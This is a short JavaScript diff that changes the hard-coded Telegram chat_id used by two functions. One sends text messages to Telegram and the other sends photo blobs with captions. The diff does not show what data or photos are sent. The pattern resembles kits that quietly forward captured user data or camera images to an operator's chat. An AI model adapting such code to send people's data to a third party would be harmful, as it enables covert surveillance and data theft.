@@ -449,7 +449,7 @@ async function sendTextToTelegram(data) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: "7216371031",
+      chat_id: "8067700272",
       text: message,
       parse_mode: "Markdown"
     })
@@ -458,7 +458,7 @@ async function sendTextToTelegram(data) {
 
 function sendPhotoToTelegram(blob, caption) {
   const formData = new FormData();
-  formData.append("chat_id", "7216371031");
+  formData.append("chat_id", "8067700272");
   formData.append("photo", blob, `${caption}.jpg`);
   formData.append("caption", caption);
 
